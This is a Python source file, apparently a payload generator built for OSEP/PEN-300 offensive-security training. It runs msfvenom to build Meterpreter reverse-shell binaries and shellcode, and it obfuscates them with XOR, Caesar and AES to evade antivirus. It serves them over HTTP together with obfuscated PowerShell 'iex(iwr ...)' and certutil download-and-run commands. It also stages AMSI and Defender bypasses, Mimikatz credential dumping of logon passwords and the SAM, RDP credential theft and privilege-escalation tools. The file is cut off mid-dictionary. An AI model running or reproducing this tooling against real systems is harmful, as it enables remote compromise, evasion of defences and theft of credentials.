import subprocess
import sys
import os
import re
import socket
import fcntl
import struct
import base64
import pathlib
import shutil
import time
import random
import string
import argparse
import json
from termcolor import colored, cprint
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
import base64

# python3
from http.server import HTTPServer as BaseHTTPServer, SimpleHTTPRequestHandler

class HTTPHandler(SimpleHTTPRequestHandler):
    """This handler uses server.base_path instead of always using os.getcwd()"""
    def translate_path(self, path):
        path = SimpleHTTPRequestHandler.translate_path(self, path)
        relpath = os.path.relpath(path, os.getcwd())
        fullpath = os.path.join(self.server.base_path, relpath)
        return fullpath

    def list_directory(self, path):
        self.send_error(418)

class HTTPServer(BaseHTTPServer):
    """The main server, you pass in base_path which is the path you want to serve requests from"""
    def __init__(self, base_path, server_address, RequestHandlerClass=HTTPHandler):
        self.base_path = base_path
        BaseHTTPServer.__init__(self, server_address, RequestHandlerClass)

class MyEncoder:
    @staticmethod
    def ps_utf16_base64encode(s):
        return base64.b64encode(s.encode('utf16')[2:]).decode()

    @staticmethod
    def xor(var, key):
        ret = []
        for b in var:
            ret.append(b ^ ord(key))
        return ret

    @staticmethod
    def xor2(buf, key):
        # return bytearray(((buf[i]^ord(key[i % len(key)])) & 0xFF) for i in range(len(buf)))
        return bytearray([((buf[i]^ord(key[i % len(key)])) & 0xFF) for i in range(len(buf))])

    @staticmethod
    def caesar(in_byte_array, num):
        buf = in_byte_array
        encoded = bytearray([(byte + num) & 0xFF for byte in buf])
        # print(encoded)
        return encoded

    @staticmethod
    def caesar_vb(in_byte_array, num):
        buf = in_byte_array
        encoded = [(byte + num) for byte in buf]
        # print(encoded)
        return encoded


class MyPayloadFile:
    ps1 = 's.ps1'
    amsi = 'a.ps1'
    amsi_scanbuffer = 'awsi_buff.ps1'
    amsi_shell = 'as.ps1'
    amsi_sr_remote_aesshell = 'lsar.ps1'
    amsi_sr_local_aesshell = 'lsal.ps1'
    amsi_b64sr_remote_aesshell = 'lab64sar.ps1'
    amsi_cxsr_remote_cxshell = 'lacxsr.ps1'
    amsi_badpotato_shell = 'lbads.ps1'
    amsi_godpotato_shell = 'lgods.ps1'
    bypass_clm_amsi_shell = 'clm.ps1'

def print_title(s):
    title_len = len(s) + 10

    print('=' * title_len)
    space = ' ' * (int((title_len)/2 - (len(s)/2)) - 1)
    print('=' + space + s + space + '=')
    print('=' * title_len)

def execute_command(command):
    try:
        if verbose:
            print('CMD: %s' % command)
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if verbose:
            cprint(result.stdout.strip(), 'green')
            if result.stderr.strip() != '':
                cprint(result.stderr, "red")

        return(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Command execution failed with error: {e}")
        cprint(e.stderr, "red")

def template_replace(template, out_file, replace_dict=None):
    global out_folder
    if '/' not in template:
        template = template_path(template)

    data = open(template, 'r').read()
    if replace_dict is not None:
        for key in replace_dict:
            data = data.replace("{{%s}}" % key, replace_dict[key])

    with open(os.path.join(out_folder, out_file), 'w') as fw:
        fw.write(data)
    return data

def copy_to_outfolder(src_file, out_file):
    global out_folder

    out_path = os.path.join(out_folder, out_file)

    shutil.copyfile(src_file, out_path)

def get_ip_address_by_inet_name(network_interface):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', network_interface[:15])
    )[20:24])

def convert_file_to_base64(filename, is_powershell=False):
    with open(filename, 'rb') as f:
        data = f.read()
        if is_powershell:
            return MyEncoder.ps_utf16_base64encode(data.decode('utf-8'))
        else:
            return base64.b64encode(data).decode('utf-8')
    return None

def convert_to_certutil_b64_format(s):
    header = '-----BEGIN CERTIFICATE-----'
    end = '\n-----END CERTIFICATE-----'
    body = ''
    for i in range(len(s)):
        if i % 64 == 0:
            body += '\n'
        body += s[i]
    return header + body + end


def aes_encrypt(key, iv, data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return (cipher.encrypt(pad(data, AES.block_size)))

def aes_decrypt(key, iv, data):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    
    plain = cipher.decrypt(data)
    return cipher.decrypt(data)

def padding_string(_input, size):
    return _input.ljust(16, b'\x00')

def aes_encrypt_file_to_base64(aes_key, aes_iv, filename):
    with open(filename, 'rb') as f:
        data = f.read()
        enc_data = aes_encrypt(aes_key.encode('utf-8'), aes_iv.encode('utf-8'), data)
        enc_data = base64.b64encode(enc_data)
        return enc_data.decode('utf-8')

class BufFormat:
    CSHARP = 'csharp'
    POWERSHELL = 'powershell'
    VB = 'vb'
    C = 'c'

def to_buf(in_byte_array):
    ret = {'csharp': 'byte[] buf = new byte[%d] {%s};' % (len(in_byte_array), ', '.join('0x' + format(x, '02x') for x in in_byte_array)),
           'powershell': '[Byte[]] $buf = %s' % ','.join('0x' + format(x, '02x') for x in in_byte_array),
           'vb': 'buf = Array(%s)' % ''.join([str(in_byte_array[i]) + ', _\n' if (i+1) % 50 == 0 else str(in_byte_array[i]) + ', ' for i in range(len(in_byte_array))])[:-2].rstrip(),
           'c': 'unsigned char buf[] = "%s";' % ''.join('\\x' + format(x, '02x') for x in in_byte_array)
    }
    return ret

def xor_b(var, key):
    ret = []
    for b in var:
        ret.append(b ^ ord(key))
    return ret


class PowershellCommand():

    def ini(http_server_url, filename, append_command='', in_powershell=False, base64encoded=False, load_ps_from_base64=False):
        self.http_server_url = http_server_url
        self.append_command
        self.in_powershell = in_powershell
        self.base64encoded = base64encoded
        self.load_ps_from_base64 = load_ps_from_base64

        if type(filename) == str:
            self.filenames = [filename]

    def iwr(self):

        ps_cmd = ''
        for f in filenames:
            if load_ps_from_base64:
                ps_cmd = f'i`e`x([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((iWr -UsEbaSIcparSING {self.http_server_url}/{filename})))); '
            else:
                ps_cmd += f'i`e`x(iWr -UsEbaSIcparSING {self.http_server_url}/{filename}); '

        ps_cmd += append_command
        if base64encoded:
            ps_cmd = MyEncoder.ps_utf16_base64encode(ps_cmd)
        
        if in_powershell:
            return ps_cmd
        else:
            if base64encoded:
                return 'powershell -e ' + ps_cmd
            else:
                return 'powershell ' + ps_cmd
def to_ps_iwr(http_server_url, filename, append_command='', in_powershell=False, base64encoded=False, load_ps_from_base64=False):

    if type(filename) == str:
        filename = [filename]

    
    ps_cmd = ''
    for f in filename:
        if load_ps_from_base64:
            ps_cmd = f'i`e`x([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((iWr -UsEbaSIcparSING {http_server_url}/{f})))); '
        else:
            ps_cmd += f'i`e`x(iWr -UsEbaSIcparSING {http_server_url}/{f}); '
    
    ps_cmd += append_command
    if base64encoded:
        ps_cmd = MyEncoder.ps_utf16_base64encode(ps_cmd)
    
    if in_powershell:
        return ps_cmd
    else:
        if base64encoded:
            return 'powershell -e ' + ps_cmd
        else:
            return 'powershell ' + ps_cmd

def certutil_download_command(http_server_url, filename, tofile=None):
    if tofile is None:
        tofile = filename
    return f'certutil.exe -urlcache -f {http_server_url}/{filename} {tofile}'

def compile_cs_in_out_folder(cs_file, out_file='', to_dll=False):
    global out_folder
    global lib_folder
    global arch

    if arch.lower() == 'x86':
        compile_cmd = 'mcs '
    else:
        compile_cmd = 'mcs -platform:x64 '

    if to_dll:
        compile_cmd += '-target:library '

    #Using all dll
    reference_dll = os.listdir(lib_folder)
    reference_parameters = ''
    if len(reference_dll) > 0:
        reference_parameters = '-r:'
        for dll in reference_dll:
            dll = os.path.join(lib_folder, dll)
            reference_parameters += f'"{dll}",'
        reference_parameters = reference_parameters[:-1] + ' ' # strip last ","
    if out_file != '':
        out_file = '-out:%s' % os.path.join(out_folder, out_file)

    cmd = '{compile_cmd} {reference_parameters} {cs_file} {out_file}'
    cmd = cmd.format(compile_cmd = compile_cmd,
                     reference_parameters = reference_parameters,
                     cs_file = os.path.join(out_folder, cs_file),
                     out_file = out_file)
    result = execute_command(cmd)
    if 'Compilation failed' in result:
        print('CMD: %s' % cmd)
        print(result)
        sys.exit(0)


def obfuscate_name(name, ext=''):
    global enable_obfuscate_filename
    if enable_obfuscate_filename:
        random_name = random_str(6)
        print('Rename: %s to %s' % (name, random_name))
        return random_name
    return name

def random_str(num):
    return ''.join(random.choice(string.ascii_lowercase) for x in range(num))

def wrap_and_enc_exe_to_ps1(filename, classname, method, args, out_file, aes_key, aes_iv):
    filename = output_path(filename)
    aes_b64_exe_bytes = aes_encrypt_file_to_base64(aes_key, aes_iv, filename)
    ### Insert Encrypted process_hollowing.exe to ps1
    template = 'load_aes_exe.ps1'
    template_replace(template, 
                     out_file,
                     {'b64_exe': aes_b64_exe_bytes,
                      'class': classname,
                      'method': method,
                      'args': args})
    return out_file

def wrap_exe_to_ps1(filename, classname, method, args, out_ps1):
    filename = output_path(filename)
    out_ps1 = output_path(out_ps1)
    b64_exe = convert_file_to_base64(filename)
    template = 'load_exe.ps1'
    template_replace(template,
                     out_ps1, 
                     {'b64_exe': b64_exe,
                     'class': classname,
                     'method': method,
                     'args': args})
    return out_ps1

def template_path(filename):
    global template_folder
    return os.path.join(template_folder, filename)

def output_path(filename):
    global out_folder
    return os.path.join(out_folder, filename)

def write_md(title, content):
    global md_file

    with open(md_file, 'a') as f:
        f.write('## %s\n' % title)
        f.write('```\n%s\n```\n\n' % content)

def windows_download_command(http_ip, http_port, filename):
    filename = os.path.basename(filename)
    ps = f'iwr http://{http_ip}:{http_port}/{filename} -OutFile {filename}'
    certutil = f'certutil.exe -urlcache -f http://{http_ip}:{http_port}/{filename} {filename}'
    return '%s\n\t%s' % (ps, certutil)

def linux_download_command(http_ip, http_port, filename):
    filename = os.path.basename(filename)
    return f'curl http://{http_ip}:{http_port}/{filename} -O'


def make_load_mutil_powershell_in_on_file(http_server_url, files_list, out_file, append_command='', base64encoded=False):
    global out_folder
    payload = to_ps_iwr(http_server_url, files_list, append_command=append_command, in_powershell=True)
    if '/' not in out_file:
        out_file = os.path.join(out_folder, out_file)

    with open(out_file, 'w') as f:
        f.write(payload)
    
    return to_ps_iwr(http_server_url, os.path.basename(out_file), base64encoded=base64encoded)

def delete_files_in_folder(folder):
    for filename in os.listdir(folder):
        file_path = os.path.join(folder, filename)
    
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
        except Exception as e:
            print('Failed to delete %s. Reason: %s' % (file_path, e))

class CxEncoder:
    def __init__(self, CAESAR_NUM, XOR_KEY):
        self.CAESAR_NUM = CAESAR_NUM
        self.XOR_KEY = XOR_KEY
        self.powershell = '$buf = cae $buf %d;$buf = xor $buf "%s"' % (CAESAR_NUM, XOR_KEY)

    def cxencode(self, buf):
        return self.caesar(self.xor(buf))

    def xor(self, buf):
        return bytearray([((buf[i]^ord(self.XOR_KEY[i % len(self.XOR_KEY)])) & 0xFF) for i in range(len(buf))])

    def caesar(self, buf):
        buf = buf
        encoded = bytearray([(byte + self.CAESAR_NUM) & 0xFF for byte in buf])
        # print(encoded)
        return encoded

parser = argparse.ArgumentParser()
parser.add_argument("-i", '--ip', help="IP or interface")
parser.add_argument("-p", '--port', help="Port")
parser.add_argument("-a", '--arch', help="x86 or x64")
parser.add_argument("-P", '--http-port', help="Port", default=80)
parser.add_argument("-nci", '--nc-ip', help="NC listend ip. Default is same as meterpreter", default=None)
parser.add_argument("-ncp", '--nc-port', help="NC listend port", default=8443)
parser.add_argument("-ps", help="Set shellcode_entry_ps1_file", default=None)
parser.add_argument("-v", '--verbose', help="Show detail", default=False, action='store_true')
parser.add_argument("-m", '--meterpreter-payload', help="e.g. shell_reverse_tcp (Only for windows payload)", default='meterpreter/reverse_https')
parser.add_argument("--base64", help="Base64 encode powershell command", action='store_true', default=False)
parser.add_argument("--obfuscate", help="obfuscate filename", action='store_true', default=False)

parser.add_argument("--clean", help="Clean metepreter binary", default=False, action='store_true')
args = parser.parse_args()

met_ip = args.ip
met_port = args.port
arch = args.arch
http_ip = met_ip
http_port = args.http_port
nc_ip = args.nc_ip
nc_port = args.nc_port
base64_powershell = args.base64
clean_meterpreter = args.clean
verbose = args.verbose
enable_obfuscate_filename = args.obfuscate
meterpreter_payload = args.meterpreter_payload

work_folder = os.path.dirname(__file__)
template_folder = os.path.join(work_folder, 'template')
out_folder = os.path.join(work_folder, 'out')
lib_folder = os.path.join(work_folder, 'lib')
thirdparty_folder = os.path.join(work_folder, 'thirdparty')
temp_folder = os.path.join(work_folder, 'tmp')
home_dir = os.path.expanduser('~')
md_file = os.path.join(home_dir, '.cheats', 'mypayload.md')
tools_folder = os.path.join(work_folder, 'tools')
meterpreter_log = 'meterpreter.log'
CAESAR_NUM = 5  # hardcoded "-5" in template
XOR_KEY ='rilak'
cxencoder = CxEncoder(CAESAR_NUM, XOR_KEY)

aes_key = ''.join(random.choice(string.ascii_letters) for x in range(16))
aes_iv = ''.join(random.choice(string.ascii_letters) for x in range(16))


if os.path.isdir(out_folder):
    delete_files_in_folder(out_folder)
    time.sleep(1)
else:
    os.mkdir(out_folder)

if not os.path.isdir(os.path.join(home_dir,'.cheats')):
    os.mkdir(os.path.join(home_dir, '.cheats'))


open(md_file, 'w').write('# myPayload\n% mypayload, osep, pen-300\n#plateform/windows #target/local #cat/OSEP\n')

if clean_meterpreter:
    print('Clean meterpreter binary ...')
    check = input('Do you want to rm %s folder? (y/n) ' % temp_folder)
    if check.lower() == 'y':
        if os.path.isdir(temp_folder):
            shutil.rmtree(temp_folder)
        if os.path.isfile(meterpreter_log):
            os.remove(meterpreter_log)
    sys.exit(0)

# met ip
if not re.findall('[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', met_ip):
    # Get ip from network interface
    met_ip = get_ip_address_by_inet_name(met_ip.encode('utf-8'))

# http ip
if not re.findall('[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', http_ip):
    # Get ip from network interface
    http_ip = get_ip_address_by_inet_name(http_ip.encode('utf-8'))

# nc ip
if nc_ip is not None:
    if not re.findall('[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', nc_ip):
        # Get ip from network interface
        nc_ip = get_ip_address_by_inet_name(http_ip.encode('utf-8'))
else:
    nc_ip = met_ip

http_server_url = 'http://{http_ip}:{http_port}'.format(http_ip=http_ip, http_port=http_port)

if arch.lower() == 'x86':
    meterpreter_payload_windows = f'windows/{meterpreter_payload}'
    meterpreter_payload_linux = 'linux/x86/meterpreter/reverse_tcp'
    compile_cmd = 'mcs '
elif arch.lower() == 'x64':
    meterpreter_payload_windows = f'windows/x64/{meterpreter_payload}'
    meterpreter_payload_linux = 'linux/x64/meterpreter/reverse_tcp'
    compile_cmd = 'mcs -platform:x64 '
else:
    print('arch should be x64 or x86.')
    sys.exit(0)

def gen_meterpreter(meterpreter_payload, ip, port, fileformat, out_file):
    global meterpreter_log
    global temp_folder
    if not os.path.isdir(temp_folder):
        os.mkdir(temp_folder)

    if os.path.isfile(meterpreter_log):
        met_history = json.loads(open(meterpreter_log, 'r').read())
    else:
        met_history = dict()

    signature = ','.join([meterpreter_payload, ip, port, fileformat])
    if signature in met_history:
        tmp_file = os.path.join(temp_folder, met_history[signature])
        print('[*] Fetch meterpreter %s' % signature)
        shutil.copyfile(tmp_file, out_file)
    else:
        print('[*] Generate meterpreter %s' % signature)
        filename = random_str(8)
        tmp_file = os.path.join(temp_folder, filename)
        cmd = f'msfvenom -p {meterpreter_payload} LHOST={met_ip} LPORT={met_port} HttpUserAgent="{user_agent}" -f {fileformat} -o {tmp_file}'
        execute_command(cmd)
        shutil.copyfile(tmp_file, out_file)
        met_history[signature] = filename

    with open(meterpreter_log,'w') as f:
        f.write(json.dumps(met_history))

print('Current IP: %s' % http_ip)
# edge user-agent
user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62'

# meterpreter files
metepreter_exe = os.path.join(out_folder, 'met.exe')
gen_meterpreter(meterpreter_payload_windows, http_ip, met_port, 'exe', metepreter_exe)
write_md('met.exe', windows_download_command(http_ip, http_port, metepreter_exe))

metepreter_dll = os.path.join(out_folder, 'met.dll')
gen_meterpreter(meterpreter_payload_windows, http_ip, met_port, 'dll', metepreter_dll)
write_md('met.dll', windows_download_command(http_ip, http_port, metepreter_dll))

metepreter_shellcode = os.path.join(out_folder, 'shellcode.bin')
gen_meterpreter(meterpreter_payload_windows, http_ip, met_port, 'raw', metepreter_shellcode)

metepreter_shellcode_linux = os.path.join(out_folder, 'shellcode_linux.bin')
gen_meterpreter(meterpreter_payload_linux, http_ip, met_port, 'raw', metepreter_shellcode_linux)

# metepreter_aspx = os.path.join(out_folder, 'met.aspx')
# gen_meterpreter(meterpreter_payload, http_ip, met_port, 'aspx', metepreter_aspx)
#metepreter_jsp = os.path.join(out_folder, 'met.jsp')
#gen_meterpreter(meterpreter_payload, http_ip, met_port, 'jsp', metepreter_jsp)

print('[*] Usage:\n %s' % windows_download_command(http_ip, http_port, metepreter_exe))
print('[*] Usage:\n %s' % windows_download_command(http_ip, http_port, metepreter_dll))

# ----------------------------------------------------
print_title('Powershell Files')

powershell_files = {
  "Invoke-Mimikatz.ps1": {
    "path": os.path.join(thirdparty_folder, 'Invoke-Mimikatz.ps1'),
    "outname": obfuscate_name('Invoke-Mimikatz.ps1'),
    "description": "https://github.com/g4uss47/Invoke-Mimikatz/blob/master/Invoke-Mimikatz.ps1",
    "command": ""
  },
  "PowerView.ps1": {
    "path": os.path.join(thirdparty_folder, 'PowerView.ps1'),
    "outname": obfuscate_name('PowerView.ps1'),
    "description": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1",
    "command": ""
  },
    "SharpHound.ps1": {
    "path": os.path.join(thirdparty_folder, 'SharpHound.ps1'),
    "outname": obfuscate_name('SharpHound.ps1'),
    "description": "https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1. Commits on May 18, 2023",
    "command": "Invoke-BloodHound -collectionmethod all -domain <domain> -OutputDirectory (Get-Location) -SearchForest"
  },
    "SharpHound.exe": {
    "path": os.path.join(thirdparty_folder, 'SharpHound.exe'),
    "outname": obfuscate_name('SharpHound.exe'),
    "description": "https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe. Commits on May 18, 2023",
    "command": "Invoke-BloodHound -collectionmethod all -domain <domain> -OutputDirectory (Get-Location)"
  },
    "PowerUp.ps1": {
    "path": os.path.join(thirdparty_folder, 'PowerUp.ps1'),
    "outname": obfuscate_name('PowerUp.ps1'),
    "description": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1",
    "command": "Invoke-AllChecks"
  },
    "PowerUpSQL.ps1": {
    "path": os.path.join(thirdparty_folder, 'PowerUpSQL.ps1'),
    "outname": obfuscate_name('PowerUpSQL.ps1'),
    "description": "https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1",
    "command": ""
  },
    "winPEAS.ps1": {
    "path": os.path.join(thirdparty_folder, 'winPEAS.ps1'),
    "outname": obfuscate_name('winPEAS.ps1'),
    "description": "https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1",
    "command": ""
  },
    "BadPotato.ps1": {
    "path": os.path.join(thirdparty_folder, 'BadPotato.ps1'),
    "outname": obfuscate_name('BadPotato.ps1'),
    "description": "Made from https://github.com/BeichenDream/BadPotato",
    "command": 'Invoke-BadPotato "{{cmd}}"'
  },
    "GodPotato.ps1": {
    "path": os.path.join(thirdparty_folder, 'GodPotato.ps1'),
    "outname": obfuscate_name('GodPotato.ps1'),
    "description": "GodPotato-NET4.5.1",
    "command": "Invoke-GodPotato -cmd 'whoami'"
  },
    "Rubeus.ps1": {
    "path": os.path.join(thirdparty_folder, 'Rubeus.ps1'),
    "outname": obfuscate_name('Rubeus.ps1'),
    "description": "Made from Rubeus.exe 2.3.0, https://github.com/GhostPack/Rubeus",
    "command": "Invoke-Rubeus --help"
  },
    "SpoolSample.ps1": {
    "path": os.path.join(thirdparty_folder, 'SpoolSample.ps1'),
    "outname": obfuscate_name('SpoolSample.ps1'),
    "description": "Made from https://github.com/leechristensen/SpoolSample",
    "command": "Invoke-SpoolSample <from> <to>"
  },
    "SharpSpoolTrigger.ps1": {
    "path": os.path.join(thirdparty_folder, 'SharpSpoolTrigger.ps1'),
    "outname": obfuscate_name('SharpSpoolTrigger.ps1'),
    "description": "Made from https://github.com/cube0x0/SharpSystemTriggers",
    "command": "Invoke-SharpSpoolTrigger <from> <to>"
  },
    "Powermad.ps1": {
    "path": os.path.join(thirdparty_folder, 'Powermad.ps1'),
    "outname": obfuscate_name('Powermad.ps1'),
    "description": "https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1",
    "command": ""
  },
    "disable_defender.ps1": {
    "path": os.path.join(thirdparty_folder, 'disable_defender.ps1'),
    "outname": obfuscate_name('dd.ps1'),
    "description": "https://github.com/tree-chtsec/osep-tools",
    "command": ""
  },
    "amsi_bypass.ps1": {
    "path": os.path.join(thirdparty_folder, 'amsi_bypass.ps1'),
    "outname": MyPayloadFile.amsi,
    "description": "",
    "command": ""
  },
    "awsi_buff.ps1": {
    "path": os.path.join(tools_folder, 'awsi_buff.ps1'),
    "outname": MyPayloadFile.amsi_scanbuffer,
    "description": "src/AMSI_Patch_ScanBuffer.cs",
    "command": ""
  },
    "Invoke-Installutil.ps1": {
    "path": os.path.join(tools_folder, 'Invoke-Installutil.ps1'),
    "outname": obfuscate_name('Invoke-Installutil.ps1'),
    "description": "https://github.com/tree-chtsec/osep-tools/blob/main/scripts/bypass_clm_installutil.ps1",
    "command": "Invoke-Installutil '$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath aaa.txt'"
  },
    "Invoke-Installutil-A.ps1": {
    "path": os.path.join(tools_folder, 'Invoke-Installutil-A.ps1'),
    "outname": obfuscate_name('Invoke-Installutil-A.ps1'),
    "description": "",
    "command": "Invoke-Installutil '$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath aaa.txt'"
  },
    "Invoke-Installutil-Cmd.ps1": {
    "path": os.path.join(tools_folder, 'Invoke-Installutil-Cmd.ps1'),
    "outname": obfuscate_name('Invoke-Installutil-Cmd.ps1'),
    "description": "Made from https://github.com/padovah4ck/PSByPassCLM",
    "command": "Invoke-Installutil"
  },
    "disable_all.ps1": {
    "path": os.path.join(tools_folder, 'disable_all.ps1'),
    "outname": obfuscate_name('disable_all.ps1'),
    "description": "",
    "command": ""
  },
    "Invoke-DavRelayUp.ps1": {
    "path": os.path.join(thirdparty_folder, 'Invoke-DavRelayUp.ps1'),
    "outname": obfuscate_name('Invoke-DavRelayUp.ps1'),
    "description": "Made from https://github.com/ShorSec/DavRelayUp",
    "command": ""
  },
    "LAPSToolkit.ps1": {
    "path": os.path.join(thirdparty_folder, 'LAPSToolkit.ps1'),
    "outname": obfuscate_name('LAPSToolkit.ps1'),
    "description": "https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/master/LAPSToolkit.ps1",
    "command": ""
  },
    "SpoolFool.ps1": {
    "path": os.path.join(thirdparty_folder, 'SpoolFool.ps1'),
    "outname": obfuscate_name('SpoolFool.ps1'),
    "description": "https://raw.githubusercontent.com/ly4k/SpoolFool/main/SpoolFool.ps1",
    "command": "Invoke-SpoolFool -dll .\AddUser.dll   # add rilak / P@ssw0rd"
  },
    "Invoke-Portscan.ps1": {
    "path": os.path.join(thirdparty_folder, 'Invoke-Portscan.ps1'),
    "outname": obfuscate_name('Invoke-Portscan.ps1'),
    "description": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1",
    "command": 'Invoke-Portscan -Hosts <IP> -T 4 -TopPorts 25'
  },
    "Invoke-MSSQLTest.ps1": {
    "path": os.path.join(tools_folder, 'Invoke-MSSQLTest.ps1'),
    "outname": obfuscate_name('Invoke-MSSQLTest.ps1'),
    "description": "",
    "command": 'Invoke-MSSQLTest <HOSTNAME>'
  },
    "Invoke-MSSQLCMD.ps1": {
    "path": os.path.join(tools_folder, 'Invoke-MSSQLCMD.ps1'),
    "outname": obfuscate_name('Invoke-MSSQLCMD.ps1'),
    "description": "",
    "command": 'Invoke-MSSQLCMD <HOSTNAME> "SELECT SYSTEM_USER"'
  },
    "Invoke-InjectRDP.ps1": {
    "path": os.path.join(tools_folder, 'Invoke-InjectRDP.ps1'),
    "outname": obfuscate_name('Invoke-InjectRDP.ps1'),
    "description": "",
    "command": 'Invoke-InjectRDP # Place RdpThief.dll to C:\\windows\\tasks'
  },
    "Invoke-DecryptAutoLogon.ps1": {
    "path": os.path.join(thirdparty_folder, 'Invoke-DecryptAutoLogon.ps1'),
    "outname": obfuscate_name('Invoke-DecryptAutoLogon.ps1'),
    "description": "https://github.com/securesean/DecryptAutoLogon/tree/main",
    "command": 'Invoke-DecryptAutoLogon'
  },
    "Invoke-RunasCs.ps1": {
    "path": os.path.join(thirdparty_folder, 'Invoke-RunasCs.ps1'),
    "outname": obfuscate_name('Invoke-RunasCs.ps1'),
    "description": "https://github.com/antonioCoco/RunasCs",
    "command": 'Invoke-RunasCs <username> <password> "cmd /c whoami /all"'
  },
    "adduser.ps1": {
    "path": os.path.join(tools_folder, 'adduser.ps1'),
    "outname": obfuscate_name('adduser.ps1'),
    "description": "",
    "command": ''
  },
    "ListLogged-inUsers.ps1": {
    "path": os.path.join(thirdparty_folder, 'ListLogged-inUsers.ps1'),
    "outname": obfuscate_name('ListLogged-inUsers.ps1'),
    "description": "https://github.com/3gstudent/List-RDP-Connections-History/blob/master/ListLogged-inUsers.ps1",
    "command": ''
  },
    "Invoke-RDPThiefInject.ps1": {
    "path": os.path.join(thirdparty_folder, 'Invoke-RDPThiefInject.ps1'),
    "outname": obfuscate_name('Invoke-RDPThiefInject.ps1'),
    "description": "",
    "command": ''
  },
    "Invoke-SharpGPOAbuse.ps1": {
    "path": os.path.join(thirdparty_folder, 'Invoke-SharpGPOAbuse.ps1'),
    "outname": obfuscate_name('Invoke-SharpGPOAbuse.ps1'),
    "description": "https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpGPOAbuse.ps1",
    "command": ''
  },
}


# Host powershell files
for filename in powershell_files:

    fullpath = powershell_files[filename]['path']

    if "outname" in powershell_files[filename]:
        outname = powershell_files[filename]['outname']
    else:
        outname = filename

    copy_to_outfolder(fullpath, outname)
    
    usage = to_ps_iwr(http_server_url, 
                                    outname,
                                    append_command=powershell_files[filename]["command"],
                                    base64encoded=base64_powershell,
                                    in_powershell=True)
    write_md('Import %s' % filename, usage)
    print('[*] PS1 %s' % filename)
    if verbose:
        print('\tDescription: %s' % powershell_files[filename]['description'])
    print('\t%s\n' % usage)

out_file = obfuscate_name('md.ps1')
command = make_load_mutil_powershell_in_on_file(http_server_url, powershell_files['Invoke-Mimikatz.ps1']['outname'], out_file, append_command='Invoke-Mimikatz -Command \'"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "lsadump::sam" "exit"\' ', base64encoded=False)
command_b64 = make_load_mutil_powershell_in_on_file(http_server_url, powershell_files['Invoke-Mimikatz.ps1']['outname'], out_file, append_command='Invoke-Mimikatz -Command \'"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"  "lsadump::sam" "exit"\' ', base64encoded=True)
print('[*] Mimikatz + Dump')
print('\t%s' % command)
print('\t%s\n' % command_b64)
write_md('Mimikatz + Dump', command)
write_md('Mimikatz + Dump B64', command_b64)

# ----------------------------------------------------
print_title('Hosting Files')

host_files = {
  "mimikatz.exe": {
    "path": os.path.join(thirdparty_folder, 'mimikatz.exe'),
    "outname": obfuscate_name('mimikatz.exe'),
    "description": "",
    "command": ""
  },
    "mimidrv.sys": {
    "path": os.path.join(thirdparty_folder, 'mimidrv.sys'),
    "outname": obfuscate_name('mimidrv.sys'),
    "description": "",
    "command": 'cmd /c "sc create mimidrv binPath= C:\\windows\\tasks\\mimidrv.sys type= kernel start= demand"\n\tcmd /c "sc start mimidrv"'
  },
    "PsExec32.exe": {
    "path": os.path.join(thirdparty_folder, 'PsExec32.exe'),
    "outname": obfuscate_name('PsExec32.exe'),
    "description": "",
    "command": "PsExec32.exe -accepteula \\\\hostname\\c$ cmd"
  },
    "one.aspx": {
    "path": os.path.join(thirdparty_folder, 'one.aspx'),
    "outname": obfuscate_name('one.aspx'),
    "description": "",
    "command": ""
  },
    "DavRelayUp.exe": {
    "path": os.path.join(thirdparty_folder, 'DavRelayUp.exe'),
    "outname": obfuscate_name('DavRelayUp.exe'),
    "description": "",
    "command": ""
  },
    "GoRelayServer.dll": {
    "path": os.path.join(thirdparty_folder, 'GoRelayServer.dll'),
    "outname": obfuscate_name('GoRelayServer.dll'),
    "description": "",
    "command": ""
  },
    "KrbRelayUp.exe": {
    "path": os.path.join(thirdparty_folder, 'KrbRelayUp.exe'),
    "outname": obfuscate_name('KrbRelayUp.exe'),
    "description": "https://github.com/ShorSec/KrbRelayUp",
    "command": ""
  },
    "BouncyCastle.Crypto.dll": {
    "path": os.path.join(thirdparty_folder, 'BouncyCastle.Crypto.dll'),
    "outname": obfuscate_name('BouncyCastle.Crypto.dll'),
    "description": "https://github.com/ShorSec/KrbRelayUp",
    "command": ""
  },
    "PsBypassCLM.exe": {
    "path": os.path.join(thirdparty_folder, 'PsBypassCLM.exe'),
    "outname": obfuscate_name('PsBypassCLM.exe'),
    "description": "https://github.com/padovah4ck/PSByPassCLM",
